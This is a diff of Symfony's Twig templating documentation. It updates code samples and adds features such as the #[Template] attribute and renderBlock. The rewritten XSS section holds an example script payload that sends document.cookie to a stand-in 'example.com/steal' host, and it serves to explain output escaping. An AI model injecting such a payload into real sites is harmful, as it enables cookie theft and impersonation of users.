@@ -6,10 +6,6 @@ whether you need to render HTML from a :doc:`controller </controller>` or genera
 the :doc:`contents of an email </mailer>`. Templates in Symfony are created with
 Twig: a flexible, fast, and secure template engine.
 
-.. caution::
-
-    Starting from Symfony 5.0, PHP templates are no longer supported.
-
 .. _twig-language:
 
 Twig Templating Language
@@ -189,34 +185,6 @@ Consider the following routing configuration:
 
 .. configuration-block::
 
-    .. code-block:: php-annotations
-
-        // src/Controller/BlogController.php
-        namespace App\Controller;
-
-        // ...
-        use Symfony\Component\HttpFoundation\Response;
-        use Symfony\Component\Routing\Annotation\Route;
-
-        class BlogController extends AbstractController
-        {
-            /**
-             * @Route("/", name="blog_index")
-             */
-            public function index(): Response
-            {
-                // ...
-            }
-
-            /**
-             * @Route("/article/{slug}", name="blog_post")
-             */
-            public function show(string $slug): Response
-            {
-                // ...
-            }
-        }
-
     .. code-block:: php-attributes
 
         // src/Controller/BlogController.php
@@ -224,7 +192,7 @@ Consider the following routing configuration:
 
         // ...
         use Symfony\Component\HttpFoundation\Response;
-        use Symfony\Component\Routing\Annotation\Route;
+        use Symfony\Component\Routing\Attribute\Route;
 
         class BlogController extends AbstractController
         {
@@ -276,7 +244,7 @@ Consider the following routing configuration:
         use App\Controller\BlogController;
         use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;
 
-        return function (RoutingConfigurator $routes) {
+        return function (RoutingConfigurator $routes): void {
             $routes->add('blog_index', '/')
                 ->controller([BlogController::class, 'index'])
             ;
@@ -361,8 +329,8 @@ as follows:
 Build, Versioning & More Advanced CSS, JavaScript and Image Handling
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-For help building, versioning and minifying your JavaScript and
-CSS assets in a modern way, read about :doc:`Symfony's Webpack Encore </frontend>`.
+For help building and versioning your JavaScript and
+CSS assets in a modern way, read about :doc:`Symfony's AssetMapper </frontend>`.
 
 .. _twig-app-variable:
 
@@ -406,6 +374,16 @@ gives you access to these variables:
 ``app.token``
     A :class:`Symfony\\Component\\Security\\Core\\Authentication\\Token\\TokenInterface`
     object representing the security token.
+``app.current_route``
+    The name of the route associated with the current request or ``null`` if no
+    request is available (equivalent to ``app.request.attributes.get('_route')``)
+``app.current_route_parameters``
+    An array with the parameters passed to the route of the current request or an
+    empty array if no request is available (equivalent to ``app.request.attributes.get('_route_params')``)
+``app.locale``
+    The locale used in the current :ref:`locale switcher <locale-switcher>` context.
+``app.enabled_locales``
+    The locales enabled in the application.
 
 In addition to the global ``app`` variable injected by Symfony, you can also
 inject variables automatically to all Twig templates as explained in the next
@@ -453,7 +431,7 @@ inside the main Twig configuration file:
         // config/packages/twig.php
         use Symfony\Config\TwigConfig;
 
-        return static function (TwigConfig $twig) {
+        return static function (TwigConfig $twig): void {
             // ...
 
             $twig->global('ga_tracking')->value('UA-xxxxx-x');
@@ -512,7 +490,7 @@ in container parameters <service-container-parameters>`:
         use function Symfony\Component\DependencyInjection\Loader\Configurator\service;
         use Symfony\Config\TwigConfig;
 
-        return static function (TwigConfig $twig) {
+        return static function (TwigConfig $twig): void {
             // ...
 
             $twig->global('uuid')->value(service('App\Generator\UuidGenerator'));
@@ -586,13 +564,81 @@ If your controller does not extend from ``AbstractController``, you'll need to
 :ref:`fetch services in your controller <controller-accessing-services>` and
 use the ``render()`` method of the ``twig`` service.
 
+.. _templates-template-attribute:
+
+Another option is to use the ``#[Template]`` attribute on the controller method
+to define the template to render::
+
+    // src/Controller/ProductController.php
+    namespace App\Controller;
+
+    use Symfony\Bridge\Twig\Attribute\Template;
+    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+    use Symfony\Component\HttpFoundation\Response;
+
+    class ProductController extends AbstractController
+    {
+        #[Template('product/index.html.twig')]
+        public function index(): array
+        {
+            // ...
+
+            // when using the #[Template] attribute, you only need to return
+            // an array with the parameters to pass to the template (the attribute
+            // is the one which will create and return the Response object).
+            return [
+                'category' => '...',
+                'promotions' => ['...', '...'],
+            ];
+        }
+    }
+
+The :ref:`base AbstractController <the-base-controller-classes-services>` also provides the
+:method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::renderBlock`
+and :method:`Symfony\\Bundle\\FrameworkBundle\\Controller\\AbstractController::renderBlockView`
+methods::
+
+    // src/Controller/ProductController.php
+    namespace App\Controller;
+
+    use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
+    use Symfony\Component\HttpFoundation\Response;
+
+    class ProductController extends AbstractController
+    {
+        // ...
+
+        public function price(): Response
+        {
+            // ...
+
+            // the `renderBlock()` method returns a `Response` object with the
+            // block contents
+            return $this->renderBlock('product/index.html.twig', 'price_block', [
+                // ...
+            ]);
+
+            // the `renderBlockView()` method only returns the contents created by the
+            // template block, so you can use those contents later in a `Response` object
+            $contents = $this->renderBlockView('product/index.html.twig', 'price_block', [
+                // ...
+            ]);
+
+            return new Response($contents);
+        }
+    }
+
+This might come handy when dealing with blocks in
+:ref:`templates inheritance <template_inheritance-layouts>` or when using
+`Turbo Streams`_.
+
 Rendering a Template in Services
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Inject the ``twig`` Symfony service into your own services and use its
 ``render()`` method. When using :doc:`service autowiring </service_container/autowiring>`
 you only need to add an argument in the service constructor and type-hint it with
-the :class:`Twig\\Environment` class::
+the `Twig Environment`_::
 
     // src/Service/SomeService.php
     namespace App\Service;
@@ -601,14 +647,12 @@ the :class:`Twig\\Environment` class::
 
     class SomeService
     {
-        private $twig;
-
-        public function __construct(Environment $twig)
-        {
-            $this->twig = $twig;
+        public function __construct(
+            private Environment $twig,
+        ) {
         }
 
-        public function someMethod()
+        public function someMethod(): void
         {
             // ...
 
@@ -699,7 +743,7 @@ provided by Symfony:
         use Symfony\Bundle\FrameworkBundle\Controller\TemplateController;
         use Symfony\Component\Routing\Loader\Configurator\RoutingConfigurator;
 
-        return function (RoutingConfigurator $routes) {
+        return function (RoutingConfigurator $routes): void {
             $routes->add('acme_privacy', '/privacy')
                 ->controller(TemplateController::class)
                 ->defaults([
@@ -724,14 +768,6 @@ provided by Symfony:
                 ])
             ;
         };
-
-.. versionadded:: 5.1
-
-    The ``context`` option was introduced in Symfony 5.1.
-
-.. versionadded:: 5.4
-
-    The ``statusCode`` option was introduced in Symfony 5.4.
 
 Checking if a Template Exists
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -782,16 +818,19 @@ errors. It's useful to run it before deploying your application to production
     # you can also show the deprecated features used in your templates
     $ php bin/console lint:twig --show-deprecations templates/email/
 
+    # you can also excludes directories
+    $ php bin/console lint:twig templates/ --excludes=data_collector --excludes=dev_tool
+
+.. versionadded:: 7.1
+
+    The option to exclude directories was introduced in Symfony 7.1.
+
 When running the linter inside `GitHub Actions`_, the output is automatically
 adapted to the format required by GitHub, but you can force that format too:
 
 .. code-block:: terminal
 
     $ php bin/console lint:twig --format=github
-
-.. versionadded:: 5.4
-
-    The ``github`` output format was introduced in Symfony 5.4.
 
 Inspecting Twig Information
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -841,6 +880,10 @@ depending on your needs:
         {# the contents of this variable are dumped inside the page contents
            and they are visible on the web page #}
         {{ dump(article) }}
+
+        {# optionally, use named arguments to display them as labels next to
+           the dumped contents #}
+        {{ dump(blog_posts: articles, user: app.user) }}
 
         <a href="/article/{{ article.slug }}">
             {{ article.title }}
@@ -1012,7 +1055,7 @@ template fragments. Configure that special URL in the ``fragments`` option:
         // config/packages/framework.php
         use Symfony\Config\FrameworkConfig;
 
-        return static function (FrameworkConfig $framework) {
+        return static function (FrameworkConfig $framework): void {
             // ...
             $framework->fragments()->path('/_fragment');
         };
@@ -1034,7 +1077,7 @@ JavaScript library.
 
 First, include the `hinclude.js`_ library in your page
 :ref:`linking to it <templates-link-to-assets>` from the template or adding it
-to your application JavaScript :doc:`using Webpack Encore </frontend>`.
+to your application JavaScript :doc:`using AssetMapper </frontend>`.
 
 As the embedded content comes from another page (or controller for that matter),
 Symfony uses a version of the standard ``render()`` function to configure
@@ -1085,7 +1128,7 @@ default content rendering some template:
         // config/packages/framework.php
         use Symfony\Config\FrameworkConfig;
 
-        return static function (FrameworkConfig $framework) {
+        return static function (FrameworkConfig $framework): void {
             // ...
             $framework->fragments()
                 ->hincludeDefaultTemplate('hinclude.html.twig')
@@ -1118,6 +1161,8 @@ Use the ``attributes`` option to define the value of hinclude.js options:
     {# by default, the JavaScript code included in the loaded contents is not run;
        set this option to 'true' to run that JavaScript code #}
     {{ render_hinclude(controller('...'), {attributes: {evaljs: 'true'}}) }}
+
+.. _template_inheritance-layouts:
 
 Template Inheritance and Layouts
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1228,7 +1273,7 @@ and leaves the repeated contents and HTML structure to some parent templates.
 
     .. code-block:: html+twig
 
-        {# app/Resources/views/blog/index.html.twig #}
+        {# templates/blog/index.html.twig #}
         {% extends 'base.html.twig' %}
 
         {# the line below is not captured by a "block" tag #}
@@ -1240,22 +1285,30 @@ and leaves the repeated contents and HTML structure to some parent templates.
 Read the `Twig template inheritance`_ docs to learn more about how to reuse
 parent block contents when overriding templates and other advanced features.
 
-Output Escaping
----------------
+.. _output-escaping:
+.. _xss-attacks:
+
+Output Escaping and XSS Attacks
+-------------------------------
 
 Imagine that your template includes the ``Hello {{ name }}`` code to display the
-user name. If a malicious user sets ``<script>alert('hello!')</script>`` as
-their name and you output that value unchanged, the application will display a
-JavaScript popup window.
+user name and a malicious user sets the following as their name:
 
-This is known as a `Cross-Site Scripting`_ (XSS) attack. And while the previous
-example seems harmless, the attacker could write more advanced JavaScript code
-to perform malicious actions.
+.. code-block:: html
+
+    My Name
+    <script type="text/javascript">
+        document.write('<img src="https://example.com/steal?cookie=' + encodeURIComponent(document.cookie) + '" style="display:none;">');
+    </script>
+
+You'll see ``My Name`` on screen but the attacker just secretly stole your cookies
+so they can impersonate you on other websites. This is known as a `Cross-Site Scripting`_
+or XSS attack.
 
 To prevent this attack, use *"output escaping"* to transform the characters
 which have special meaning (e.g. replace ``<`` by the ``&lt;`` HTML entity).
 Symfony applications are safe by default because they perform automatic output
-escaping thanks to the :ref:`Twig autoescape option <config-twig-autoescape>`:
+escaping:
 
 .. code-block:: html+twig
 
@@ -1323,7 +1376,7 @@ the ``value`` is the Twig namespace, which is explained later:
         // config/packages/twig.php
         use Symfony\Config\TwigConfig;
 
-        return static function (TwigConfig $twig) {
+        return static function (TwigConfig $twig): void {
             // ...
 
             // directories are relative to the project root dir (but you
@@ -1379,7 +1432,7 @@ configuration to define a namespace for each template directory:
         // config/packages/twig.php
         use Symfony\Config\TwigConfig;
 
-        return static function (TwigConfig $twig) {
+        return static function (TwigConfig $twig): void {
             // ...
 
             $twig->path('email/default/templates', 'email');
@@ -1405,10 +1458,10 @@ may include their own Twig templates (in the ``Resources/views/`` directory of
 each bundle). To avoid messing with your own templates, Symfony adds bundle
 templates under an automatic namespace created after the bundle name.
 
-For example, the templates of a bundle called ``AcmeFooBundle`` are available
-under the ``AcmeFoo`` namespace. If this bundle includes the template
-``<your-project>/vendor/acmefoo-bundle/Resources/views/user/profile.html.twig``,
-you can refer to it as ``@AcmeFoo/user/profile.html.twig``.
+For example, the templates of a bundle called ``AcmeBlogBundle`` are available
+under the ``AcmeBlog`` namespace. If this bundle includes the template
+``<your-project>/vendor/acme/blog-bundle/templates/user/profile.html.twig``,
+you can refer to it as ``@AcmeBlog/user/profile.html.twig``.
 
 .. tip::
 
@@ -1422,7 +1475,7 @@ Writing a Twig Extension
 
 `Twig Extensions`_ allow the creation of custom functions, filters, and more to use
 in your Twig templates. Before writing your own Twig extension, check if
-the filter/function that you need is already implemented in:
+the filter/function that you need is not already implemented in:
 
 * The `default Twig filters and functions`_;
 * The :doc:`Twig filters and functions added by Symfony </reference/twig_reference>`;
@@ -1451,14 +1504,14 @@ Create a class that extends ``AbstractExtension`` and fill in the logic::
 
     class AppExtension extends AbstractExtension
     {
-        public function getFilters()
+        public function getFilters(): array
         {
             return [
                 new TwigFilter('price', [$this, 'formatPrice']),
             ];
         }
 
-        public function formatPrice($number, $decimals = 0, $decPoint = '.', $thousandsSep = ',')
+        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
         {
             $price = number_format($number, $decimals, $decPoint, $thousandsSep);
             $price = '$'.$price;
@@ -1478,14 +1531,14 @@ If you want to create a function instead of a filter, define the
 
     class AppExtension extends AbstractExtension
     {
-        public function getFunctions()
+        public function getFunctions(): array
         {
             return [
                 new TwigFunction('area', [$this, 'calculateArea']),
             ];
         }
 
-        public function calculateArea(int $width, int $length)
+        public function calculateArea(int $width, int $length): int
         {
             return $width * $length;
         }
@@ -1543,7 +1596,7 @@ callable defined in ``getFilters()``::
 
     class AppExtension extends AbstractExtension
     {
-        public function getFilters()
+        public function getFilters(): array
         {
             return [
                 // the logic of this filter is now implemented in a different class
@@ -1569,7 +1622,7 @@ previous ``formatPrice()`` method::
             // extensions, you'll need to inject services using this constructor
         }
 
-        public function formatPrice($number, $decimals = 0, $decPoint = '.', $thousandsSep = ',')
+        public function formatPrice(float $number, int $decimals = 0, string $decPoint = '.', string $thousandsSep = ','): string
         {
             $price = number_format($number, $decimals, $decPoint, $thousandsSep);
             $price = '$'.$price;
@@ -1582,23 +1635,25 @@ If you're using the default ``services.yaml`` configuration, this will already
 work! Otherwise, :ref:`create a service <service-container-creating-service>`
 for this class and :doc:`tag your service </service_container/tags>` with ``twig.runtime``.
 
-.. _`Twig`: https://twig.symfony.com
-.. _`tags`: https://twig.symfony.com/doc/3.x/tags/index.html
+.. _`Cross-Site Scripting`: https://en.wikipedia.org/wiki/Cross-site_scripting
+.. _`default Twig filters and functions`: https://twig.symfony.com/doc/3.x/#reference
 .. _`filters`: https://twig.symfony.com/doc/3.x/filters/index.html
 .. _`functions`: https://twig.symfony.com/doc/3.x/functions/index.html
-.. _`with_context`: https://twig.symfony.com/doc/3.x/functions/include.html
-.. _`Twig template loader`: https://twig.symfony.com/doc/3.x/api.html#loaders
-.. _`Twig raw filter`: https://twig.symfony.com/doc/3.x/filters/raw.html
-.. _`Twig output escaping docs`: https://twig.symfony.com/doc/3.x/api.html#escaper-extension
-.. _`snake case`: https://en.wikipedia.org/wiki/Snake_case
-.. _`Twig template inheritance`: https://twig.symfony.com/doc/3.x/tags/extends.html
-.. _`Twig block tag`: https://twig.symfony.com/doc/3.x/tags/block.html
-.. _`Cross-Site Scripting`: https://en.wikipedia.org/wiki/Cross-site_scripting
 .. _`GitHub Actions`: https://docs.github.com/en/free-pro-team@latest/actions
-.. _`UX Twig Component`: https://symfony.com/bundles/ux-twig-component/current/index.html
-.. _`UX Live Component`: https://symfony.com/bundles/ux-live-component/current/index.html
-.. _`Twig Extensions`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension
-.. _`default Twig filters and functions`: https://twig.symfony.com/doc/3.x/#reference
-.. _`official Twig extensions`: https://github.com/twigphp?q=extra
 .. _`global variables`: https://twig.symfony.com/doc/3.x/advanced.html#id1
 .. _`hinclude.js`: https://mnot.github.io/hinclude/
+.. _`Turbo Streams`: https://symfony.com/bundles/ux-turbo/current/index.html
+.. _`official Twig extensions`: https://github.com/twigphp?q=extra
+.. _`snake case`: https://en.wikipedia.org/wiki/Snake_case
+.. _`tags`: https://twig.symfony.com/doc/3.x/tags/index.html
+.. _`Twig block tag`: https://twig.symfony.com/doc/3.x/tags/block.html
+.. _`Twig Environment`: https://github.com/twigphp/Twig/blob/3.x/src/Environment.php
+.. _`Twig Extensions`: https://twig.symfony.com/doc/3.x/advanced.html#creating-an-extension
+.. _`Twig output escaping docs`: https://twig.symfony.com/doc/3.x/api.html#escaper-extension
+.. _`Twig raw filter`: https://twig.symfony.com/doc/3.x/filters/raw.html
+.. _`Twig template inheritance`: https://twig.symfony.com/doc/3.x/tags/extends.html
+.. _`Twig template loader`: https://twig.symfony.com/doc/3.x/api.html#loaders
+.. _`Twig`: https://twig.symfony.com
+.. _`UX Live Component`: https://symfony.com/bundles/ux-live-component/current/index.html
+.. _`UX Twig Component`: https://symfony.com/bundles/ux-twig-component/current/index.html
+.. _`with_context`: https://twig.symfony.com/doc/3.x/functions/include.html
